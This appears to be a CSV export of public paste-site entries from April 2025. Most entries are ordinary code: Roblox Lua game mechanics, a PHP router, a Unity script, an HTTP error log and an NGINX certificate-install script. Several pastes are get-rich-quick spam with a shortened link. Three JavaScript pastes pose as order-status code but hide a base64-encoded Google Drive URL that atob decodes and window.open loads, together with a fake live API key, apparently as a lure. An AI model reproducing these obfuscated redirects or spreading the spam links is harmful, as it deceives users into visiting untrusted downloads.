id,title,username,language,date,content
hBUZpZaE,Untitled,mach10,Lua,Tuesday 8th of April 2025 07:02:27 AM CDT,"--// Services
local ReplicatedStorage = game:GetService('ReplicatedStorage');
local Resources = require(ReplicatedStorage:WaitForChild('Resources'));

local Players = game:GetService('Players')
local TweenService = game:GetService('TweenService')
local LocalPlayer = Players.LocalPlayer

local Animating = {}
Animating.Relay = {}

--// Mechanics
function Animating:Animate(Player, Preset, CFrames) -- (Player, {Duration, Style}, {Limb, CFrameStart, CFrameEnd})
	if (Player and Preset and CFrames) == nil then 
		return false
	end

	local WeldExist, Weld = false, nil

	local Head = Player.Character:FindFirstChild(""Head"")
	local Torso = Player.Character:FindFirstChild(""Torso"")

	local RightArm = Player.Character:FindFirstChild(""Right Arm"")
	local LeftArm = Player.Character:FindFirstChild(""Left Arm"")
	local RightLeg = Player.Character:FindFirstChild(""Right Leg"")
	local LeftLeg = Player.Character:FindFirstChild(""Left Leg"")

	local Appendiges = {
		RightArm,
		LeftArm,
		RightLeg,
		LeftLeg,
		Head
	}

	local Loaded = true
	for _, v in Appendiges do
		if (v == nil) then
			Loaded = false
			break
		end
	end

	if not Loaded then
		return false
	end

	local Corresponding = {
		Torso:FindFirstChild(""Right Shoulder""),
		Torso:FindFirstChild(""Left Shoulder""),
		Torso:FindFirstChild(""Right Hip""), 
		Torso:FindFirstChild(""Left Hip""),
		Torso:FindFirstChild(""Neck"")
	}

	local End = {}
	End.C0 = CFrames[3]

	local Info = TweenInfo.new(
		Preset[1] or 0.1, Preset[2] or Enum.EasingStyle.Linear, Enum.EasingDirection.Out
	)

	for i, weld in pairs(Torso:GetChildren()) do
		if weld:IsA(""Weld"") and weld.Part1.Name == CFrames[1] then
			WeldExist = true
			Weld = weld
		end
	end

	if not WeldExist then
		Weld = Instance.new(""Weld"")
	end 

	for i, Joints in pairs(Appendiges) do
		if CFrames[1] == Joints.Name then
			Corresponding[i].Part1 = nil

			Weld.Parent = Torso
			Weld.Part0 = Torso
			Weld.Part1 = Joints
			Weld.C0 = CFrames[2]

			local Animation = TweenService:Create(Weld, Info, End)
			Animation:Play()
		end
	end
	return true
end

function Animating:ResetAnimations(Player)
	if (Player) == nil then
		return false
	end

	local Head = Player.Character:FindFirstChild(""Head"")
	local Torso = Player.Character:FindFirstChild(""Torso"") 

	if (Torso == nil) then
		return false
	end

	local RightArm = Player.Character:FindFirstChild(""Right Arm"")
	local LeftArm = Player.Character:FindFirstChild(""Left Arm"")
	local RightLeg = Player.Character:FindFirstChild(""Right Leg"")
	local LeftLeg = Player.Character:FindFirstChild(""Left Leg"")

	local LS = Torso:FindFirstChild(""Left Shoulder"")
	local RS = Torso:FindFirstChild(""Right Shoulder"")
	local LH = Torso:FindFirstChild(""Left Hip"")
	local RH = Torso:FindFirstChild(""Right Hip"")
	local NE = Torso:FindFirstChild(""Neck"")

	local Joints = {
		Torso:FindFirstChild(""Right Shoulder""),
		Torso:FindFirstChild(""Left Shoulder""),
		Torso:FindFirstChild(""Right Hip""), 
		Torso:FindFirstChild(""Left Hip""),
		Torso:FindFirstChild(""Neck"")
	}

	local Corresponding = {
		RightArm,
		LeftArm,
		RightLeg,
		LeftLeg,
		Head
	}

	for i , v in Corresponding do
		if (v == nil) then
			table.remove(Corresponding, i)
			table.remove(Joints, i)
		end	
	end

	for Index, Weld in pairs(Torso:GetChildren()) do
		if Weld:IsA(""Weld"") then
			if Weld.Name == 'Held' then
				continue
			end

			Weld:Destroy()
		end
	end

	for i, joint in pairs(Joints) do
		if joint.Part1 ~= Corresponding[i] then
			joint.Part1 = Corresponding[i]
		end
	end	
	return true	
end

--// Events
Animating.Relay['Animate'] = function(Player, Info, CFrames)
	if (Player == LocalPlayer) then
		return false
	end
	return Animating:Animate(Player, Info, CFrames)
end

Animating.Relay['Reset'] = function(Player)
	if (Player == LocalPlayer) then
		return false
	end
	return Animating:ResetAnimations(Player)
end

--// Connect Events
Resources['Functions'].Connect_Remote(Resources['Remotes']:FindFirstChild('Edit Welds'), function(Topic, ...)
	if (Animating.Relay[Topic] ~= nil) then
		return Animating.Relay[Topic](...)
	end
	return false, warn('[ANIMATE]; Relay doesnt have topic; '.. Topic ..' (Edit Welds)')
end)

return Animating"
h8gNt9hP,Untitled,mach10,Lua,Tuesday 8th of April 2025 07:02:06 AM CDT,"--// Services
local ReplicatedStorage = game:GetService('ReplicatedStorage');
local Resources = require(ReplicatedStorage:WaitForChild('Resources'));

local Players = game:GetService('Players')
local LocalPlayer = Players.LocalPlayer

--// Functions
local RBLXTouched = {}
RBLXTouched.__index = RBLXTouched

function RBLXTouched:Setup(Table : {})
	if (Table) == nil or (string.lower(typeof(Table)) ~= 'table') then
		return false
	end

	setmetatable(Table, RBLXTouched)
	return Table
end

function RBLXTouched:IsTouchingBall()
	if (self['Force'] == nil or string.lower(typeof(self['Force'])) ~= 'function') then
		return false
	end
	
	if (self['Limbs'] ~= nil and string.lower(typeof(self['Limbs'])) == 'table') and (LocalPlayer.Character ~= nil) then
		local Character = LocalPlayer.Character
		local GottenLimbs = {}
		
		for _, v in self['Limbs'] do
			if (string.lower(typeof(v)) == 'string') then
				for i, x in Character:GetChildren() do
					if (x:IsA('Part') or x:IsA('BasePart')) then
						if (string.lower(x.Name) == string.lower(v)) then
							table.insert(GottenLimbs, x)
						end
					end
				end
			end
		end
		
		for _, v in GottenLimbs do
			if (v:IsA('Part') or v:IsA('BasePart')) then
				for i, x in v:GetTouchingParts() do
					if (x.Parent == nil or x.Parent.Name ~= 'MACH') then
						continue
					elseif (x:GetAttribute('Anchored') == true) then
						continue
					end
					
					if (self['Forces'][1] ~= nil) then
						return task.spawn(function()
							self['Forces'][1](x, v.Name)
						end)
					end
					return
				end
			end
		end
	end
	return false
end

function RBLXTouched:Start()
	if (self['Forces'] == nil or string.lower(typeof(self['Forces'][1])) ~= 'function') then
		return false
	elseif (self['Limbs'] ~= nil and string.lower(typeof(self['Limbs'])) == 'table') and (LocalPlayer.Character ~= nil) then
		local Character = LocalPlayer.Character
		local GottenLimbs = {}

		for _, v in self['Limbs'] do
			if (string.lower(typeof(v)) == 'string') then
				for i, x in Character:GetChildren() do
					if (x:IsA('Part') or x:IsA('BasePart')) then
						if (string.lower(x.Name) == string.lower(v)) then
							table.insert(GottenLimbs, x)
						end
					end
				end
			end
		end
	
		for _, v in GottenLimbs do
			if (v:IsA('Part') or v:IsA('BasePart')) then
				v.Touched:Connect(function(Ball)
					if not (self['Kick']) then
						return false
					elseif (Ball.Parent ~= nil and Ball.Parent.Name == 'MACH') then
						if (Ball:GetAttribute('Anchored') == true) then
							return false
						end
						
						if (self['Forces'][1] ~= nil) then
							return coroutine.wrap(function()
								return task.spawn(function()
									self['Forces'][1](Ball, v.Name)
								end)
							end)()
						end
					elseif (self['Shield'] ~= nil and self['Shield']) and (Ball.Name == 'Shield' and (string.lower(Ball.Parent.Name) ~= string.lower(LocalPlayer.Name))) then
						if (self['Forces'][2] ~= nil) then
							return coroutine.wrap(function()
								return task.spawn(function()
									self['Forces'][2]()
								end)
							end)()
						end
					end
					return true
				end)
			end
		end
	end
end

return RBLXTouched"
uXhZTfN1,Untitled,mach10,Lua,Tuesday 8th of April 2025 07:01:18 AM CDT,"--// Main
local ReplicatedStorage = game:GetService('ReplicatedStorage');
local Resources = require(ReplicatedStorage:WaitForChild('Resources'));

--// Services
local Debris = game:GetService('Debris')
local Players = game:GetService('Players')
local LocalPlayer = Players.LocalPlayer

--// Player Instances
local PlayerGUI = LocalPlayer:FindFirstChildOfClass('PlayerGui')
local PlayerScripts = LocalPlayer:FindFirstChildOfClass('PlayerScripts')

-- GUI
local ToolsGUI = PlayerGUI:WaitForChild('Tools', 5)
local InterfaceGUI = PlayerGUI:WaitForChild('Interface', 5)

--// Modules
local Mechanics = {}
local Callbacks = {};
local SecondTouches = {
	['Default'] = 0.4;
	['Dribble'] = 0.5;
	['Shoot'] = 0.2;
	['Aero'] = 0.4;
	['Fake'] = 0.3;
};

local AnimateModule = require(PlayerScripts:WaitForChild('Management', 5).Animate)
Mechanics.Animations = require(PlayerScripts:WaitForChild('Management', 5).Animate.Animations)

--// Tweens
local TweensModule = require(Resources['Modules'].Tweens)
TweensModule = TweensModule:Setup({
	['Foot Indicators'] = {};
	['Powerbar'] = {}
})

TweensModule:Insert({
	['R'] = TweensModule.Service:Create(ToolsGUI['R'], TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut), {TextTransparency = 1});
	['L'] = TweensModule.Service:Create(ToolsGUI['L'], TweenInfo.new(0.6, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut), {TextTransparency = 1});
}, 'Foot Indicators')

--// Functions
function Mechanics:AddCallback(Topic, Name, Function) -- Reset for fouls / ankles
	if (Topic and Name and Function) == nil then
		return false
	end
	
	if (string.lower(typeof(Function)) ~= 'function') then
		return false
	end
	
	if (Callbacks[Topic] == nil) then
		return false
	end
	
	Topic = Callbacks[Topic]
	Topic[Name] = Function
	return true
end

function Mechanics:TriggerCallback(Topic)
	if (Topic == nil or Callbacks[Topic] == nil) then
		return false
	end
	
	Topic = Callbacks[Topic]
	for i, Callback in Topic do
		if (string.lower(typeof(Callback)) == 'function') then
			Callback()
		end
	end
	return true
end

function Mechanics:Coroutine(Function)
	if (Function == nil or string.lower(typeof(Function)) ~= 'function') then
		return false
	end
	
	local Task = task.spawn(function()
		coroutine.wrap(Function)()
	end)
	
	return function() 
		task.cancel(Task)
	end
end

-- Player Animating
function Mechanics:Animate(Info, CFrames)
	coroutine.wrap(function()
		AnimateModule:Animate(LocalPlayer, Info, CFrames)
		return Resources['Remotes']:FindFirstChild('Edit Welds'):FireServer('Animate', Info, CFrames)
	end)()
	return true
end

function Mechanics:ResetAnimations()
	coroutine.wrap(function()
		AnimateModule:ResetAnimations(LocalPlayer)
		return Resources['Remotes']:FindFirstChild('Edit Welds'):FireServer('Reset')
	end)()
	return true
end

-- Basic Variables
function Mechanics:Reset()
	--// Variables
	Mechanics.Variables = {
		-- Booleans
		Debounce = false;
		Ragdoll = false;
		Getup = false;
		Dive = false;
		Catch = false;
		Reflex = false;
		Camera = false;
		Foul = false;
		
		-- Others
		Held = nil;
		Leg = 'Right';
	};
	
	Callbacks = {
		['Reset'] = {}
	};
	
	--// Functions
end

function Mechanics:SetVariable(Name, Bool)
	if (Name) == nil then
		return false
	end
	
	for i, v in Mechanics.Variables do
		if (string.lower(i) == string.lower(Name)) then
			Mechanics.Variables[i] = Bool
			return true
		end
	end
	
	warn('[MECHANICS]; Variable; ' .. Name .. ' wasnt found (:SetVariable)')
	return 0;
end

function Mechanics:GetVariable(Name)
	if (Name) == nil then
		return false
	end

	for i, v in Mechanics.Variables do
		if (string.lower(i) == string.lower(Name)) then
			return v
		end
	end
	
	warn('[MECHANICS]; Variable; ' .. Name .. ' wasnt found (:GetVariable)')
	return 0;
end

-- Client Actions
function Mechanics:SwitchFoot() 
	if (Mechanics:GetVariable('Leg') == 'Right') then
		Mechanics:SetVariable('Leg', 'Left')
		return true, Mechanics:SwitchFootUIToggle('L')
	end
	
	Mechanics:SetVariable('Leg', 'Right')
	return true, Mechanics:SwitchFootUIToggle('R')
end

function Mechanics:SwitchFootUIToggle(Leg)
	Resources.Functions['PlaySound']('Hover', 'Squirm', nil, Resources['_G'][""Tool Sound FX""])
	TweensModule:Pause('Foot Indicators', string.upper(Leg))
	InterfaceGUI:FindFirstChild('Buttons').Main.Foot.Text = string.upper(Leg)
	--ToolsGUI['L'].TextTransparency = 1
	--ToolsGUI['R'].TextTransparency = 1
	ToolsGUI[string.upper(Leg)].TextTransparency = 0
	TweensModule:Play('Foot Indicators', string.upper(Leg))
	return true
end

-- Proper Catch Checks
-- Debug Prints
function Mechanics.TestDebugPrint(s)
	if (Resources['_G']['Test Print Debug']) then
		return warn(s)
	end
	return false
end

function Mechanics.DebugPrints(s)
	if (Resources['_G']['Print Debug']) then
		return print(s)
	end
	return false
end

-- React Check
function Mechanics.IsSecondTouch(Ball : Part)
	if (Ball == nil) then
		return true -- basically true = second touching, ball is nil so return true so the game doesnt process
	elseif (Ball:FindFirstChild('Second Touch')) and (Ball['Second Touch'].Value ~= LocalPlayer) then
		Mechanics.TestDebugPrint('[MECHANICS]; Second touch detected')
		return true
	end
	return false
end

function Mechanics.IsReach(Ball :Part)
	if (Ball == nil) then
		return true -- basically true = is reaching, ball is nil so return true so the game doesnt process
	end
	
	if (LocalPlayer.Character == nil) then
		return true
	end
	
	local Character = LocalPlayer.Character
	local HRP = Character:FindFirstChild('HumanoidRootPart')
	
	if (HRP == nil) then
		return true
	end
	
	local Velocity = (Ball.AssemblyLinearVelocity.Magnitude)
	Velocity = math.abs(Velocity)
	
	local Distance = (Ball.Position - HRP.Position).Magnitude
	Distance = math.abs(Distance)
	
	if (Distance > 5.3 and Velocity < 28) then
		Mechanics.TestDebugPrint('[MECHANICS]; Reach detected due to high distance')
		return true
	end
	return false
end

function Mechanics.CanReact(Ball : Part)
	if (Ball == nil) then
		return false
	elseif (LocalPlayer.Character == nil) then
		return false
	end
	
	local Anchored = Ball:GetAttribute('Anchored')
	local Held = Ball:GetAttribute('Held')
	
	if (Anchored == true) then
		Mechanics.TestDebugPrint('[MECHANICS]; Ball is attributed as anchored (CanReact)')
		return false
	end
	
	if (Held ~= 0) then
		Mechanics.TestDebugPrint('[MECHANICS]; Ball is attributed as held (CanReact)')
		return false
	end
	return true
end

-- React Functions
function Mechanics:Rainbow(Bind, Instances, Package, Magnus)
	if (Bind and Instances and Package) == nil then
		return false
	end

	local Ball, Limb, CDPreset = unpack(Instances)
	local MaxForce, Direction, Power, Height = unpack(Package)

	if (Ball and MaxForce and Power and Height) == nil then 
		return false
	end
	
	if not (Mechanics.CanReact(Ball)) then
		return false
	end
	
	for _, v in Ball:GetChildren() do
		if (v:IsA('BodyVelocity') or v:IsA('BodyAngularVelocity') or v:IsA('BodyForce')) then
			v:Destroy()
		end
	end

	local IsOwner = Ball:GetAttribute('Owner') == LocalPlayer.UserId
	local SecondTouchCD = SecondTouches[CDPreset] or SecondTouches['Default']

	local BCFrame = Ball.CFrame
	if not IsOwner then
		if (Mechanics.IsSecondTouch(Ball)) then
			return false
		elseif (Mechanics.IsReach(Ball)) then
			return false
		elseif not Resources['Remotes']:FindFirstChild('Call Network'):InvokeServer(Ball, SecondTouchCD) then
			return false, task.spawn(function()
				table.clear(Instances)
				table.clear(Package)

				if (string.lower(typeof(Magnus)) == 'table') then
					table.clear(Magnus)
				end
			end)
		end

		if (Ball.AssemblyLinearVelocity.Magnitude) > 35 then
			Ball.AssemblyLinearVelocity = Vector3.zero
		end
	end
	
	task.delay(0.12, function()
		if (Direction[1] and Direction[2]) == nil then
			return false
		end

		--if not (MaxForce.X == 0 and MaxForce.Z == 0) then
		--	Ball.AssemblyLinearVelocity = Vector3.zero
		--end

		local BodyVelocity = Instance.new('BodyVelocity')
		BodyVelocity.MaxForce = MaxForce
		BodyVelocity.Velocity = (Direction[1].CFrame * Direction[2]).LookVector * Power
		BodyVelocity.Velocity = BodyVelocity.Velocity * Vector3.new(1, 0, 1)
		BodyVelocity.Velocity = BodyVelocity.Velocity + Height
		BodyVelocity.Parent = Ball
		Debris:AddItem(BodyVelocity, 0.3)

		local Volume = (BodyVelocity.Velocity.Magnitude / 60)
		if Volume < 0.1 then
			Volume = 0.1
		end

		if (Resources['_G']['Ball Sound FX']) and (Ball:FindFirstChild('Sounds') and Ball.Sounds:FindFirstChild('Kick')) then
			Ball.Sounds['Kick']:Pause()
			Ball.Sounds['Kick'].TimePosition = 0
			Ball.Sounds['Kick'].Volume = Volume
			Ball.Sounds['Kick']:Play()
		end

		Resources['Remotes']:FindFirstChild('Ball Debug'):FireServer('Ball Sounds', Ball, 'Kick', Volume)
		return true
	end)
	return true
end

function Mechanics:React(Bind, Instances, Package, Magnus)
	if (Bind and Instances and Package) == nil then
		return false
	end
	
	local Ball, Limb, CDPreset = unpack(Instances)
	local MaxForce, Power, Height = unpack(Package)
	 
	if (Ball and MaxForce and Power and Height) == nil then 
		return false
	end

	if not (Mechanics.CanReact(Ball)) then
		return false
	end

	for _, v in Ball:GetChildren() do
		if (v:IsA('BodyVelocity') or v:IsA('BodyAngularVelocity') or v:IsA('BodyForce')) then
			v:Destroy()
		end
	end

	local IsOwner = Ball:GetAttribute('Owner') == LocalPlayer.UserId
	local SecondTouchCD = SecondTouches[CDPreset] or SecondTouches['Default']

	if not (MaxForce.X == 0 and MaxForce.Z == 0) then
		Ball.AssemblyLinearVelocity = Vector3.zero
	end
	
	local BodyVelocity = Instance.new('BodyVelocity')
	BodyVelocity.MaxForce = MaxForce
	BodyVelocity.Velocity = Power
	BodyVelocity.Velocity = BodyVelocity.Velocity * Vector3.new(1, 0, 1)
	BodyVelocity.Velocity = BodyVelocity.Velocity + Height
	BodyVelocity.Parent = Ball
	Debris:AddItem(BodyVelocity, 0.3)
	
	local BCFrame = Ball.CFrame
	if not IsOwner then
		if (Mechanics.IsSecondTouch(Ball)) then
			return false
		elseif (Mechanics.IsReach(Ball)) then
			return false
		elseif not Resources['Remotes']:FindFirstChild('Call Network'):InvokeServer(Ball, SecondTouchCD) then
			return false, task.spawn(function()
				BodyVelocity:Destroy()
				table.clear(Instances)
				table.clear(Package)

				if (string.lower(typeof(Magnus)) == 'table') then
					table.clear(Magnus)
				end
			end)
		end
	end
	
	local Volume = (BodyVelocity.Velocity.Magnitude / 60)
	if Volume < 0.1 then
		Volume = 0.1
	end
	
	if (Resources['_G']['Ball Sound FX']) and (Ball:FindFirstChild('Sounds') and Ball.Sounds:FindFirstChild('Kick')) then
		Ball.Sounds['Kick']:Pause()
		Ball.Sounds['Kick'].TimePosition = 0
		Ball.Sounds['Kick'].Volume = Volume
		Ball.Sounds['Kick']:Play()
	end
	
	Resources['Remotes']:FindFirstChild('Ball Debug'):FireServer('Ball Sounds', Ball, 'Kick', Volume)
	
	if not IsOwner then
		Resources['Remotes']:FindFirstChild('Ball Debug'):FireServer('React Bubble', Ball, BCFrame, 'Player')
	end
	return true
end

--// Reset Handler
Resources['Functions'].Wrap_PRINTS(function()
	Mechanics:Reset()
	
	LocalPlayer.CharacterAdded:Connect(function()
		return Mechanics:Reset()
	end)
	return true
end) 

return Mechanics"
vePtCnTs,EARN $900 INSTANTLY 2025⭐ YF,SzymonG110,JavaScript,Tuesday 8th of April 2025 07:00:58 AM CDT," 
Pdf https://surl.li/lgybtn


PPcxbShj4J
"
7FeV8sbf,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:58:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76313/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RsSteWeE,Make $1000 15-MINUTES ⭐ (BEGINNER) BB,SzymonG110,JavaScript,Tuesday 8th of April 2025 06:47:29 AM CDT," 
Pdf https://surl.li/lgybtn


AqFu0GRVVC
"
HRLw2j76,Untitled,lignite0,PHP,Tuesday 8th of April 2025 06:43:38 AM CDT,"<?php

function text($path, $default = """")
{
    $file = __DIR__ . ""/.data/$path"";
    return file_exists($file) ? trim(file_get_contents($file)) : $default;
}

function routing($dir, $input)
{
    $segments = explode(""/"", $input);
    $currentFolder = $dir;
    while (count($segments) > 0) {
        $segment = array_shift($segments);
        if (strpos($segment, "".."") !== false) {
            header(""HTTP/1.1 404 Not Found"");
            header(""X-Error: Double dot in path"");
            exit;
        }
        $path = ""$currentFolder/$segment.php"";
        if (is_file($path)) {
            return $path;
        }
        $path = ""$currentFolder/$segment"";
        if (is_dir($path)) {
            $currentFolder = ""$currentFolder/$segment"";
            continue;
        }
        $path = ""$currentFolder/_id.php"";
        if (is_file($path)) {
            return $path;
        }
        $path = ""$currentFolder/_404.php"";
        if (is_file($path)) {
            return $path;
        }
        return __DIR__ . ""/.routes/_404.php"";
    }
    $file = ""$currentFolder/_index.php"";
    if (is_file($file)) {
        return $file;
    }
    return __DIR__ . ""/.routes/_404.php"";
}

$path = $_GET[""path""] ?: ""products/1234"";

$cfg_title = ""example.com"";
$file = routing(__DIR__ . ""/.routes"", $path);

require $file;
"
KZJR1Rzf,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:43:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39380/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hu86StCA,Untitled,lemansky,C#,Tuesday 8th of April 2025 06:43:24 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

public class Blaster : MonoBehaviour
{
    // Start is called before the first frame update
    public GameObject bulletPrefab;
    public float fireRate = 0.2f;
    public float fireCooldown = -1.0f;
    public AudioClip bulletClip;
    AudioSource audioSource;
    void Start()
    {
        audioSource = GameObject.Find(""BulletSound"").GetComponent<AudioSource>();
    }
    void Update()
    {
        if (Input.GetMouseButtonDown(0) && Time.time > fireCooldown)
        {
            fireCooldown = Time.time + fireRate;
            GameObject bullet = Instantiate(bulletPrefab, transform.position, transform.rotation);
            audioSource.PlayOneShot(bulletClip);
            StartCoroutine(DestroyDelay(bullet));
        }
    }

    IEnumerator DestroyDelay(GameObject bullet)
    {
        yield return new WaitForSeconds(5.0f);
        Destroy(bullet);
    }
}"
x5tcY5UL,2025-04-08T13:39:23.931499,powerampache,PHP,Tuesday 8th of April 2025 06:39:22 AM CDT,"1.01-79-play (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Failed to connect to abaloche.freeboxos.fr/[2a01:e0a:2c3:c990::1]:443"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Failed to connect to abaloche.freeboxos.fr/[2a01:e0a:2c3:c990::1]:443\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Failed to connect to abaloche.freeboxos.fr/[2a01:e0a:2c3:c990::1]:443\"" }"",""stackTrace"":[]}"
01Gg4AXa,⭐EARN $900 INSTANTLY 2025 MI,SzymonG110,JavaScript,Tuesday 8th of April 2025 06:34:04 AM CDT," 
Pdf https://surl.li/lgybtn


mZ9gB0bMuu
"
4JzbPD8n,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:27:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81490/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wmqgnG7X,Certificate Installer,theinhumaneme,Bash,Tuesday 8th of April 2025 06:21:27 AM CDT,"#!/bin/bash
# ----------------------------------------------------------------------------
#    Code File: certinstall.sh
#    Author: Kalyan Mudumby
#    Date: 08 April 2025
#    Description:
#           Automate and streamline certificate updates for NGINX deployments.
#
#   Built with Love ❤️ by Kalyan Mudumby 🚀
# ----------------------------------------------------------------------------

set -euo pipefail

# Fetch the date in YYYY-MM-DD Format
DATE=$(date +%F)

# Fail if no domain value is passed
if [ -z ""${1:-}"" ]; then
    echo ""Usage: $0 <domain>""
    exit 1
fi

DOMAIN=$1

# Configurable Paths
NGINX_CONF_DIR=""/usr/local/nginx/conf""
NGINX_BACKUP_DIR=""/usr/local/nginx/backup""
GEO_BACKUP_DIR=""$HOME/geocerts/backup""
GEOCERTS_DIR=""$HOME/geocerts""
GITLAB_BASE_URL=""""

# Associative Arrays: domain -> snippet ID
declare -A CRT_SNIPPETS
declare -A KEY_SNIPPETS

# Define per-domain snippet IDs
CRT_SNIPPETS[thesmartice]=
KEY_SNIPPETS[thesmartice]=

CRT_SNIPPETS[thesmartcity311]=
KEY_SNIPPETS[thesmartcity311]=

CRT_SNIPPETS[ilhelpline]=
KEY_SNIPPETS[ilhelpline]=

CRT_SNIPPETS[mahelpline]=
KEY_SNIPPETS[mahelpline]=

CRT_SNIPPETS[vthelplink]=
KEY_SNIPPETS[vthelplink]=

CRT_SNIPPETS[orhelpline]=
KEY_SNIPPETS[orhelpline]=


# Utility Functions
log() {
    echo ""[$(date '+%F %T')] $1""
}

backup() {
    log ""Backing up existing NGINX config""
    sudo mkdir -p ""$NGINX_BACKUP_DIR/${DOMAIN}_$DATE""
    sudo cp -r ""$NGINX_CONF_DIR/""* ""$NGINX_BACKUP_DIR/${DOMAIN}_$DATE""

    log ""Backing up existing certificates to GEOCERTS folder""
    sudo mkdir -p ""$GEO_BACKUP_DIR/$DATE""
    sudo mv ""$NGINX_CONF_DIR/$DOMAIN.crt"" ""$GEO_BACKUP_DIR/${DOMAIN}_$DATE""
    sudo mv ""$NGINX_CONF_DIR/$DOMAIN.key"" ""$GEO_BACKUP_DIR/${DOMAIN}_$DATE""
}

download_certificates() {
    CRT_ID=${CRT_SNIPPETS[$DOMAIN]:-}
    KEY_ID=${KEY_SNIPPETS[$DOMAIN]:-}

    if [ -z ""$CRT_ID"" ] || [ -z ""$KEY_ID"" ]; then
        echo ""Missing snippet IDs for domain '$DOMAIN'""
        exit 1
    fi

    log ""Downloading certificates for $DOMAIN from GitLab snippets""
    sudo mkdir -p ""$GEOCERTS_DIR/$DOMAIN/""
    sudo wget ""$GITLAB_BASE_URL/$KEY_ID/raw/main/$DOMAIN.key"" -O ""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.key""
    sudo wget ""$GITLAB_BASE_URL/$CRT_ID/raw/main/$DOMAIN.crt"" -O ""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.crt""
}

validate_download() {
    log ""Validating downloaded certificate files for $DOMAIN""

    local crt_path=""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.crt""
    local key_path=""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.key""

    if [ ! -f ""$crt_path"" ]; then
        echo ""❌ Error: Missing downloaded file: $DOMAIN.crt""
        exit 1
    fi

    if [ ! -f ""$key_path"" ]; then
        echo ""❌ Error: Missing downloaded file: $DOMAIN.key""
        exit 1
    fi
}

deploy_certificates() {
    log ""Copying new certificates to NGINX config""
    sudo cp -r ""$GEOCERTS_DIR/$DOMAIN/""* ""$NGINX_CONF_DIR""

    log ""Validating nginx config""
    sudo nginx -t

    log ""Restarting nginx""
    sudo systemctl restart nginx.service

    log ""Displaying certificate details:""
    openssl x509 -in ""$NGINX_CONF_DIR/$DOMAIN.crt"" -text -noout
}

log whoami
log pwd
backup
download_certificates
validate_download
deploy_certificates
"
